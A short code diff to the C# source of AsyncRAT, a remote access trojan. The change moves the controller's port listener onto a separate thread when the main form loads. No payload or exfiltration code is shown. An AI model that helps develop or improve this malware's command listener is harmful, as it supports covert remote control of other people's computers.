@@ -5,6 +5,7 @@ using AsyncRAT_Sharp.Sockets;
 using System.Threading.Tasks;
 using Microsoft.VisualBasic;
 using System.Linq;
+using System.Threading;
 
 //       │ Author     : NYAN CAT
 //       │ Name       : AsyncRAT // Simple Socket
@@ -25,7 +26,8 @@ namespace AsyncRAT_Sharp
        async private void Form1_Load(object sender, EventArgs e)
         {
             Listener listener = new Listener();
-            listener.Connect(Settings.Port);
+            Thread thread = new Thread(new ParameterizedThreadStart(listener.Connect));
+            thread.Start(Settings.Port);
 
             while (true)
             {
